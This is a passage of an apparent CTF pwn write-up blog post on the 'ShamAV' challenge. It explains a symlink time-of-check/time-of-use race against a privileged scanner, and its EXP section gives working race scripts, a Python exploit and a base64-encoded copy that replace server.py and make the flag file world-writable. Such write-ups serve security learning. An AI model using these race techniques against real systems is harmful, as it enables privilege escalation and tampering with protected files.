+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">scan</span><span class="p">(</span><span class="n">recvall</span><span class="p">(</span><span class="n">conn</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="err">&#39;</span><span class="n">surrogateescape</span><span class="err">&#39;</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">log</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="p">[</span><span class="n">I</span><span class="p">]</span><span class="w"> </span><span class="n">Scan</span><span class="w"> </span><span class="n">result</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">res</span><span class="p">}</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">try</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">conn</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">except</span><span class="w"> </span><span class="n">OSError</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">e</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">log</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="p">[</span><span class="n">E</span><span class="p">]</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">sendall</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">e</span><span class="p">}</span><span class="err">&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>and the <code>launch.sh</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#! /usr/bin/env bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> -e
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> <span class="s2">&#34;</span><span class="k">$(</span>dirname -- <span class="s2">&#34;</span><span class="si">${</span><span class="nv">BASH_SOURCE</span><span class="p">[0]</span><span class="si">}</span><span class="s2">&#34;</span><span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> main <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;----- Welcome to ShamAV, version alpha 0.0.1 -----&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;***** Begin System information *****&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Working directory: </span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Directory listing:&#34;</span>
+</span></span><span class="line"><span class="cl">    ls -la
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;***** End System information *****&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="o">(</span> <span class="nb">umask</span> 077<span class="p">;</span> head -c <span class="m">32</span> /dev/urandom <span class="p">|</span> base64 &gt; seed <span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> ./server.py 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> <span class="s2">&#34;[I] Launcher shutting down...&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[!] ShamAV server has crashed, restarting in 1 second...&#34;</span>
+</span></span><span class="line"><span class="cl">        sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[I] Restarting ShamAV server&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">main &gt; av.log</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The vuln is in <code>_scan</code> method:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_scan</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[I] Scanning file </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">lstat</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">st_uid</span> <span class="o">!=</span> <span class="n">USER_UID</span><span class="p">:</span> <span class="c1"># check</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;You do not have permission to scan this item&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">OSError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;Error from OS: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target_path</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;/home/antivirus/quarantine/sham-av-</span><span class="si">{</span><span class="n">genrandom</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[D] Copying file from </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s1"> to </span><span class="si">{</span><span class="n">target_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shutil</span><span class="o">.</span><span class="n">copyfile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">target_path</span><span class="p">)</span> <span class="c1"># used</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can create a file which belongs to <code>ctf</code> to bypass the check of <code>USER_UID</code>, then remove the file and create a symbol link to <code>/home/antivirus/seed</code> with the same name instantly. In a lucky moment, the <code>/home/antivirus/seed</code>file is copied to <code>/home/antivirus/quarantine</code>, so we can read the content of <code>seed</code> and get its data.</p>
+<p>Once we get <code>seed</code>, we can generate and forecast all the next <code>sha-256</code> digest values using <code>genrandom</code> method in <code>server.py</code>.</p>
+<h3 class="heading-element" id="solution-3"><span>Solution</span>
+  <a href="#solution-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>The steps:</p>
+<ul>
+<li>
+<p>use symbol link attack to leak seed data and calculate the next <code>sha-256</code> hash values</p>
+</li>
+<li>
+<p>create many soft symbol links in <code>/home/antivirus/quarantine</code>  with the format <code>/home/antivirus/quarantine/sham-av-{known-digest-value}</code>, all of these links point to <code>/home/antivirus/server.py</code></p>
+</li>
+<li>
+<p>create a file <code>/home/ctf/server.py</code>, with content:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;chmod 777 /home/antivirus/flag.txt&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>execute <code>/home/ctf/bin/scan /home/ctf/server.py</code> to replace the <code>/home/antivirus/server.py</code> with <code>/home/ctf/server.py</code></p>
+</li>
+<li>
+<p>remove all file in <code>/home/antivirus/quarantine</code></p>
+</li>
+<li>
+<p>try to <code>toctou</code> attack <code>/home/antivirus/flag.txt</code> and in a moment, an exception is raised when  <code>shutil.copyfile</code> is called, because  the parameter <code>src</code> which point to <code>/home/antivirus/flag.txt</code> is not readable</p>
+</li>
+<li>
+<p><code>launch.sh</code> would execute <code>./server.py</code> again, but the file has been replaced, so <code>os.system(chmod 777 flag.txt)</code> is executed</p>
+</li>
+</ul>
+<h3 class="heading-element" id="exp-4"><span>EXP</span>
+  <a href="#exp-4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>First, use following command to create three bash scripts:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nwhile true; do rm -rf /home/ctf/flag;touch /home/ctf/flag;rm -rf /home/ctf/flag;ln -s /home/antivirus/seed /home/ctf/flag;sleep 0.1; done&#39;</span> &gt; exp1.sh <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nwhile true; do rm -rf /home/ctf/flag;touch /home/ctf/flag;rm -rf /home/ctf/flag;ln -s /home/antivirus/flag.txt /home/ctf/flag; done&#39;</span> &gt; exp2.sh <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nwhile true; do /home/ctf/bin/scan /home/ctf/flag; done&#39;</span> &gt; attack.sh <span class="o">&amp;&amp;</span> chmod +x *.sh</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then, execute:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">timeout <span class="m">60</span> ./exp1.sh <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">timeout <span class="m">60</span> ./attack.sh</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, the seed file has been copied to <code>/home/antivirus/quarantine</code>, create a symbol link <code>/home/ctf/seed</code> to point to the seed file in <code>/home/antivirus/quarantine</code></p>
+<p>Use <code>base64</code> to write <code>go.py</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctr</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">CTR_LENGTH</span> <span class="o">=</span> <span class="mi">256</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;seed&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">seed</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">genrandom</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">ctr</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">ctr</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">CTR_LENGTH</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">seed</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ctr</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;#! /usr/bin/env python3
+</span></span></span><span class="line"><span class="cl"><span class="s2">import os
+</span></span></span><span class="line"><span class="cl"><span class="s2">os.system(&#34;chmod 777 /home/antivirus/flag.txt&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/home/ctf/server.py&#34;</span><span class="p">,</span> <span class="s2">&#34;wt&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;chmod +x /home/ctf/server.py&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x200</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filepath</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;/home/antivirus/quarantine/sham-av-</span><span class="si">{</span><span class="n">genrandom</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ln -s /home/antivirus/server.py </span><span class="si">{</span><span class="n">filepath</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># replace server.py</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;/home/ctf/bin/scan /home/ctf/server.py&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># remove all files</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm -rf /home/antivirus/quarantine/*&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># check</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls -al /home/antivirus/quarantine&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls -al /home/antivirus/server.py&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>And, execute command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat &gt; tmp <span class="s">&lt;&lt; EOF
+</span></span></span><span class="line"><span class="cl"><span class="s">aW1wb3J0IGJhc2U2NCwgaGFzaGxpYiwgb3MKY3RyID0gMApDVFJfTEVOR1RIID0gMjU2Cgp3aXRo
+</span></span></span><span class="line"><span class="cl"><span class="s">IG9wZW4oJ3NlZWQnKSBhcyBmOgogICAgc2VlZCA9IGJhc2U2NC5iNjRkZWNvZGUoZi5yZWFkKCkp
+</span></span></span><span class="line"><span class="cl"><span class="s">CgpkZWYgZ2VucmFuZG9tKCk6CiAgICBnbG9iYWwgY3RyCiAgICByZXN1bHQgPSBoYXNobGliLnNo
+</span></span></span><span class="line"><span class="cl"><span class="s">YTI1NihjdHIudG9fYnl0ZXMoQ1RSX0xFTkdUSCwgYnl0ZW9yZGVyPSdsaXR0bGUnKSArIHNlZWQp
+</span></span></span><span class="line"><span class="cl"><span class="s">LmhleGRpZ2VzdCgpCiAgICBjdHIgKz0gMQogICAgcmV0dXJuIHJlc3VsdAoKZGF0YSA9ICIiIiMh
+</span></span></span><span class="line"><span class="cl"><span class="s">IC91c3IvYmluL2VudiBweXRob24zCmltcG9ydCBvcwpvcy5zeXN0ZW0oImNobW9kIDc3NyAvaG9t
+</span></span></span><span class="line"><span class="cl"><span class="s">ZS9hbnRpdmlydXMvZmxhZy50eHQiKQoiIiIKCndpdGggb3BlbigiL2hvbWUvY3RmL3NlcnZlci5w
+</span></span></span><span class="line"><span class="cl"><span class="s">eSIsICJ3dCIsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICBmLndyaXRlKGRhdGEucmVwbGFj
+</span></span></span><span class="line"><span class="cl"><span class="s">ZSgiXHJcbiIsICJcbiIpKQogICAgZi5mbHVzaCgpCgpvcy5zeXN0ZW0oImNobW9kICt4IC9ob21l
+</span></span></span><span class="line"><span class="cl"><span class="s">L2N0Zi9zZXJ2ZXIucHkiKQoKZm9yIGkgaW4gcmFuZ2UoMHgyMDApOgogICAgZmlsZXBhdGggPSBm
+</span></span></span><span class="line"><span class="cl"><span class="s">Jy9ob21lL2FudGl2aXJ1cy9xdWFyYW50aW5lL3NoYW0tYXYte2dlbnJhbmRvbSgpfScKICAgIGlm
+</span></span></span><span class="line"><span class="cl"><span class="s">IG5vdCBvcy5wYXRoLmV4aXN0cyhmaWxlcGF0aCk6CiAgICAgICAgb3Muc3lzdGVtKGYibG4gLXMg
+</span></span></span><span class="line"><span class="cl"><span class="s">L2hvbWUvYW50aXZpcnVzL3NlcnZlci5weSB7ZmlsZXBhdGh9IikKCiMgcmVwbGFjZSBzZXJ2ZXIu
+</span></span></span><span class="line"><span class="cl"><span class="s">cHkKb3Muc3lzdGVtKCIvaG9tZS9jdGYvYmluL3NjYW4gL2hvbWUvY3RmL3NlcnZlci5weSIpCgpv
+</span></span></span><span class="line"><span class="cl"><span class="s">cy5zeXN0ZW0oInJtIC1yZiAvaG9tZS9hbnRpdmlydXMvcXVhcmFudGluZS8qIikKCiMgY2hlY2sK
+</span></span></span><span class="line"><span class="cl"><span class="s">b3Muc3lzdGVtKCJscyAtYWwgL2hvbWUvYW50aXZpcnVzL3F1YXJhbnRpbmUiKQpvcy5zeXN0ZW0o
+</span></span></span><span class="line"><span class="cl"><span class="s">ImxzIC1hbCAvaG9tZS9hbnRpdmlydXMvc2VydmVyLnB5Iik=
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">base64 -d tmp &gt; go.py
+</span></span><span class="line"><span class="cl">python3 go.py</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./exp2.sh <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">timeout <span class="m">60</span> ./attack.sh</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If you&rsquo;re a lucky boy, you will find the <code>/home/antivirus/flag.txt</code> is <code>rwxrwxrwx</code>, now, capture the flag:</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508223638363.png' alt="image-20220508223638363"></p>
+<h2 class="heading-element" id="reference"><span>Reference</span>
+  <a href="#reference" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>1、<a href="https://roderickchan.github.io"target="_blank" rel="external nofollow noopener noreferrer">My Blog<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>2、<a href="https://ctf-wiki.org/"target="_blank" rel="external nofollow noopener noreferrer">Ctf Wiki<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>3、<a href="https://github.com/RoderickChan/pwncli"target="_blank" rel="external nofollow noopener noreferrer">pwncli<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2022-05-08 15:15:44">Updated on 2022-05-08&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://roderickchan.github.io/2022-sdctf-all-pwn-wp/" data-title="2022-Sdctf-All-Pwn-Wp" data-hashtags="pwn"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://roderickchan.github.io/2022-sdctf-all-pwn-wp/" data-hashtag="pwn"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://roderickchan.github.io/2022-sdctf-all-pwn-wp/" data-title="2022-Sdctf-All-Pwn-Wp"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
